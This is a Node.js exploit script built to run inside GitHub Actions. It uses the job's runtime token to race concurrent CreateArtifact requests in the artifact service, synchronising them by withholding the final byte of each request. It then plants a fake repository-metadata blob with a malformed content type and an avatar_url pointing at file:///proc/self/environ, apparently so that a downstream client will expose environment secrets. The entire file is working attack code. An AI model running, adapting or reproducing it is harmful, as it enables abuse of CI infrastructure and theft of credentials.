'use strict';

const crypto = require('node:crypto');
const fs = require('node:fs');
const https = require('node:https');
const tls = require('node:tls');

const ARTIFACT_SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ODD_TYPE = '\x85application/json';
const EXPECTED_TYPE_HEX = Buffer.from(ODD_TYPE, 'latin1').toString('hex');
const MAX_RESPONSE = 2 * 1024 * 1024;
const CANDIDATES = 24;
const CREATE_FANOUT = 8;

function fail(message) {
  throw new Error(message);
}

function sleep(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

function backendIds(token) {
  const pieces = token.split('.');
  if (pieces.length < 2) fail('ACTIONS_RUNTIME_TOKEN is not a JWT');
  const claims = JSON.parse(Buffer.from(pieces[1], 'base64url').toString('utf8'));
  const scope = String(claims.scp || '')
    .split(' ')
    .find((item) => item.startsWith('Actions.Results:'));
  const fields = scope?.split(':') || [];
  if (fields.length !== 3) fail('Actions.Results scope is unavailable');
  return {workflowRunBackendId: fields[1], workflowJobRunBackendId: fields[2]};
}

function request(urlString, {method = 'GET', headers = {}, body = null} = {}) {
  const url = new URL(urlString);
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method, headers}, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({
        status: response.statusCode || 0,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.setTimeout(20000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

async function twirp(method, token, value) {
  const resultsOrigin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const url = new URL(`/twirp/${ARTIFACT_SERVICE}/${method}`, resultsOrigin);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request(url.href, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    const error = new Error(`${method} returned HTTP ${response.status}`);
    error.status = response.status;
    throw error;
  }
  return JSON.parse(response.body.toString('utf8'));
}

async function putBlob(signedUrl, body) {
  const response = await request(signedUrl, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': ODD_TYPE,
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    throw new Error(`blob upload returned HTTP ${response.status}`);
  }
}

function decodeChunked(body) {
  const chunks = [];
  let offset = 0;
  while (true) {
    const lineEnd = body.indexOf('\r\n', offset, 'latin1');
    if (lineEnd < 0) fail('truncated chunk-size line');
    const sizeToken = body.subarray(offset, lineEnd).toString('ascii').split(';', 1)[0];
    if (!/^[0-9a-fA-F]+$/.test(sizeToken)) fail('invalid chunk-size line');
    const size = Number.parseInt(sizeToken, 16);
    offset = lineEnd + 2;
    if (size === 0) return Buffer.concat(chunks);
    if (offset + size + 2 > body.length) fail('truncated chunk body');
    chunks.push(body.subarray(offset, offset + size));
    offset += size + 2;
  }
}

function parseRawResponse(raw) {
  const boundary = raw.indexOf('\r\n\r\n', 0, 'latin1');
  if (boundary < 0) fail('HTTP response omitted header terminator');
  const lines = raw.subarray(0, boundary).toString('latin1').split('\r\n');
  const statusMatch = /^HTTP\/1\.[01] (\d{3})/.exec(lines.shift() || '');
  if (!statusMatch) fail('invalid HTTP status line');
  const headers = new Map();
  for (const line of lines) {
    const colon = line.indexOf(':');
    if (colon < 1) continue;
    const name = line.slice(0, colon).toLowerCase();
    const value = line.slice(colon + 1).replace(/^[ \t]+/, '');
    if (!headers.has(name)) headers.set(name, []);
    headers.get(name).push(value);
  }
  let body = raw.subarray(boundary + 4);
  const transferEncoding = (headers.get('transfer-encoding') || []).join(',').toLowerCase();
  if (transferEncoding.split(',').map((item) => item.trim()).includes('chunked')) {
    body = decodeChunked(body);
  } else if (headers.has('content-length')) {
    body = body.subarray(0, Number(headers.get('content-length')[0]));
  }
  return {status: Number(statusMatch[1]), headers, body};
}

function rawTlsGet(urlString, headers = {}) {
  const url = new URL(urlString);
  if (url.protocol !== 'https:') fail('raw verifier requires HTTPS');
  const authority = url.port ? `${url.hostname}:${url.port}` : url.hostname;
  const lines = [
    `GET ${url.pathname}${url.search} HTTP/1.1`,
    `Host: ${authority}`,
    'Connection: close',
    'Accept-Encoding: identity',
    ...Object.entries(headers).map(([name, value]) => `${name}: ${value}`),
    '',
    '',
  ];
  return new Promise((resolve, reject) => {
    const chunks = [];
    let length = 0;
    let settled = false;
    const finish = (error, value) => {
      if (settled) return;
      settled = true;
      error ? reject(error) : resolve(value);
    };
    const socket = tls.connect({
      host: url.hostname,
      port: Number(url.port || 443),
      servername: url.hostname,
      ALPNProtocols: ['http/1.1'],
    }, () => socket.write(Buffer.from(lines.join('\r\n'), 'latin1')));
    socket.setTimeout(20000, () => socket.destroy(new Error('TLS timeout')));
    socket.on('data', (chunk) => {
      length += chunk.length;
      if (length > MAX_RESPONSE) {
        socket.destroy(new Error('oversized response'));
        return;
      }
      chunks.push(Buffer.from(chunk));
    });
    socket.on('end', () => {
      try {
        finish(null, parseRawResponse(Buffer.concat(chunks)));
      } catch (error) {
        finish(error);
      }
    });
    socket.on('error', (error) => finish(error));
  });
}

// Open every TLS connection first and send a complete HTTP request except for
// its final body byte.  Releasing all final bytes in one event-loop tick makes
// the CreateArtifact handlers cross the same-name insertion boundary together;
// Promise.all(https.request(...)) still includes DNS/TCP/TLS arrival jitter.
function stageRawRequest(urlString, headers, body) {
  const url = new URL(urlString);
  if (url.protocol !== 'https:') fail('staged request requires HTTPS');
  const authority = url.port ? `${url.hostname}:${url.port}` : url.hostname;
  const headerLines = [
    `POST ${url.pathname}${url.search} HTTP/1.1`,
    `Host: ${authority}`,
    'Connection: close',
    ...Object.entries(headers).map(([name, value]) => `${name}: ${value}`),
    '',
    '',
  ];
  const requestHead = Buffer.from(headerLines.join('\r\n'), 'latin1');
  const prefix = Buffer.concat([requestHead, body.subarray(0, -1)]);
  const finalByte = body.subarray(-1);

  let resolveResult;
  let rejectResult;
  const result = new Promise((resolve, reject) => {
    resolveResult = resolve;
    rejectResult = reject;
  });

  const ready = new Promise((resolve, reject) => {
    const chunks = [];
    let length = 0;
    let staged = false;
    let settled = false;
    const finish = (error, value) => {
      if (settled) return;
      settled = true;
      error ? rejectResult(error) : resolveResult(value);
    };
    const socket = tls.connect({
      host: url.hostname,
      port: Number(url.port || 443),
      servername: url.hostname,
      ALPNProtocols: ['http/1.1'],
    }, () => {
      socket.write(prefix, (error) => {
        if (error) {
          reject(error);
          finish(error);
          return;
        }
        staged = true;
        resolve({
          release() {
            socket.end(finalByte);
          },
          result,
        });
      });
    });
    socket.setTimeout(20000, () => socket.destroy(new Error('staged TLS timeout')));
    socket.on('data', (chunk) => {
      length += chunk.length;
      if (length > MAX_RESPONSE) {
        socket.destroy(new Error('oversized staged response'));
        return;
      }
      chunks.push(Buffer.from(chunk));
    });
    socket.on('end', () => {
      try {
        finish(null, parseRawResponse(Buffer.concat(chunks)));
      } catch (error) {
        finish(error);
      }
    });
    socket.on('error', (error) => {
      if (!staged) reject(error);
      finish(error);
    });
  });
  return ready;
}

async function synchronizedCreates(token, common) {
  const endpoint = new URL(
    `/twirp/${ARTIFACT_SERVICE}/CreateArtifact`,
    new URL(process.env.ACTIONS_RESULTS_URL).origin,
  );
  const specifications = Array.from({length: CREATE_FANOUT}, (_, index) =>
    index % 2 === 0 ? [6, ODD_TYPE] : [7, 'application/json']);
  if (Number(common.index) % 2) specifications.reverse();

  let bodies = specifications.map(([version, mimeType]) => Buffer.from(JSON.stringify({
    workflow_run_backend_id: common.workflow_run_backend_id,
    workflow_job_run_backend_id: common.workflow_job_run_backend_id,
    name: common.name,
    version,
    mime_type: mimeType,
  })));
  const longest = Math.max(...bodies.map((body) => body.length));
  // Trailing JSON whitespace equalizes Content-Length and keeps the withheld
  // final byte at the same transport offset for the v6 and v7 requests.
  bodies = bodies.map((body) => Buffer.concat([body, Buffer.alloc(longest - body.length, 0x20)]));

  const staged = await Promise.all(bodies.map((body) => stageRawRequest(endpoint.href, {
    Authorization: `Bearer ${token}`,
    Accept: 'application/json',
    'Content-Type': 'application/json',
    'Content-Length': String(body.length),
  }, body)));
  await sleep(100);
  staged.forEach((handle) => handle.release());
  const responses = await Promise.allSettled(staged.map((handle) => handle.result));
  return responses.map((item, requestIndex) => {
    if (item.status === 'rejected') {
      return {requestIndex, error: item.reason?.message || String(item.reason)};
    }
    const response = item.value;
    let value = {};
    try {
      value = JSON.parse(response.body.toString('utf8'));
    } catch {}
    return {
      requestIndex,
      version: specifications[requestIndex][0],
      status: response.status,
      ok: Boolean(value.ok),
      url: value.signed_upload_url || value.signedUploadUrl || '',
      message: String(value.msg || response.body.toString('utf8')).slice(0, 180),
    };
  });
}

function firstHeader(response, name) {
  return (response.headers.get(name.toLowerCase()) || [''])[0];
}

function payload(repositoryPath) {
  return Buffer.from(JSON.stringify({
    full_name: repositoryPath,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette v6/v7 race carrier',
    stargazers_count: 0,
  }));
}

async function verifyArtifact(repositoryPath, githubToken, expectedBody) {
  const endpoint = `https://api.github.com/repos/${repositoryPath}`;
  let response;
  for (let attempt = 0; attempt < 8; attempt += 1) {
    response = await rawTlsGet(endpoint, {
      Accept: 'application/vnd.github.v3+json',
      Authorization: `Bearer ${githubToken}`,
      'User-Agent': 'repo-cassette-race-verifier',
      'X-GitHub-Api-Version': '2022-11-28',
    });
    if (![404, 409].includes(response.status)) break;
    await sleep(600);
  }
  if (response.status >= 300 && response.status < 400) {
    const location = firstHeader(response, 'location');
    if (!location) fail('artifact redirect omitted Location');
    response = await rawTlsGet(new URL(location, endpoint).href, {
      'User-Agent': 'repo-cassette-race-verifier',
    });
  }
  const contentTypeHex = Buffer.from(firstHeader(response, 'content-type'), 'latin1').toString('hex');
  return {
    status: response.status,
    contentTypeHex,
    bodyMatch: response.body.equals(expectedBody),
    digest: crypto.createHash('sha256').update(response.body).digest('hex'),
  };
}

function output(name, value) {
  if (process.env.GITHUB_OUTPUT) {
    fs.appendFileSync(process.env.GITHUB_OUTPUT, `${name}=${value}\n`);
  }
}

async function createCandidate(index, token, ids, githubRepository) {
  const common = {
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
    name: `repo-cassette-race-${process.env.GITHUB_RUN_ID}-${process.env.RACE_SHARD || '0'}-${index}-${Date.now()}`,
    index,
  };
  const creations = await synchronizedCreates(token, common);
  const created = creations
    .filter((item) => item.status >= 200 && item.status < 300 && item.ok && item.url)
    .map((item) => ({signed_upload_url: item.url, version: item.version}));
  if (created.length < 2) {
    return {index, stage: 'create', created: created.length, creations};
  }

  const placeholder = Buffer.from('{"probe":"placeholder"}');
  await Promise.all(created.map((item) => putBlob(item.signed_upload_url, placeholder)));
  const finalizeInput = {
    workflow_run_backend_id: common.workflow_run_backend_id,
    workflow_job_run_backend_id: common.workflow_job_run_backend_id,
    name: common.name,
    size: String(placeholder.length),
  };
  const finalizations = await Promise.allSettled([
    twirp('FinalizeArtifact', token, finalizeInput),
    twirp('FinalizeArtifact', token, finalizeInput),
  ]);
  const artifactIds = [...new Set(finalizations
    .filter((item) => item.status === 'fulfilled' && item.value?.ok)
    .map((item) => String(item.value.artifact_id))
    .filter((item) => /^\d+$/.test(item)))];
  if (!artifactIds.length) return {index, stage: 'finalize', artifactIds};

  const checks = [];
  for (const artifactId of artifactIds) {
    const repositoryPath = `${githubRepository}/actions/artifacts/${artifactId}/zip`;
    const body = payload(repositoryPath);
    await Promise.all(created.map((item) => putBlob(item.signed_upload_url, body)));
    await sleep(250);
    try {
      const signed = await twirp('GetSignedArtifactURL', token, {
        workflow_run_backend_id: ids.workflowRunBackendId,
        workflow_job_run_backend_id: ids.workflowJobRunBackendId,
        name: common.name,
      });
      let direct = await rawTlsGet(signed.signed_url || signed.signedUrl, {
        'User-Agent': 'repo-cassette-race-verifier',
      });
      const wire = {
        status: direct.status,
        contentTypeHex: Buffer.from(firstHeader(direct, 'content-type'), 'latin1').toString('hex'),
        bodyMatch: direct.body.equals(body),
        digest: crypto.createHash('sha256').update(direct.body).digest('hex'),
      };
      checks.push({artifactId, repositoryPath, wire});
      if (wire.status === 200 && wire.contentTypeHex === EXPECTED_TYPE_HEX && wire.bodyMatch) {
        return {index, winner: true, artifactId, repositoryPath, wire};
      }
    } catch (error) {
      checks.push({artifactId, error: error.message});
    }
  }
  return {index, winner: false, artifactIds, checks};
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const githubToken = process.env.GITHUB_TOKEN;
  const githubRepository = process.env.GITHUB_REPOSITORY;
  if (!token || !githubToken || !githubRepository) fail('GitHub Actions environment is incomplete');
  const ids = backendIds(token);
  const rows = [];

  for (let offset = 0; offset < CANDIDATES; offset += 4) {
    const batch = [];
    for (let index = offset; index < Math.min(offset + 4, CANDIDATES); index += 1) {
      batch.push(createCandidate(index, token, ids, githubRepository));
    }
    const settled = await Promise.allSettled(batch);
    for (const item of settled) {
      const row = item.status === 'fulfilled' ? item.value : {error: item.reason?.message || String(item.reason)};
      rows.push(row);
      console.log(`RACE_RESULT ${JSON.stringify(row)}`);
      if (row.winner) {
        output('winner_artifact_id', row.artifactId);
        output('winner_repository', row.repositoryPath);
        console.log(`RACE_WINNER ${JSON.stringify(row)}`);
        return;
      }
    }
  }

  const summary = {
    candidates: rows.length,
    contentTypes: rows.flatMap((row) => row.checks || []).map((item) => item.wire?.contentTypeHex || null),
  };
  console.log(`RACE_SUMMARY ${JSON.stringify(summary)}`);
  throw new Error('no verified v6/v7 race carrier was produced');
}

main().catch((error) => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
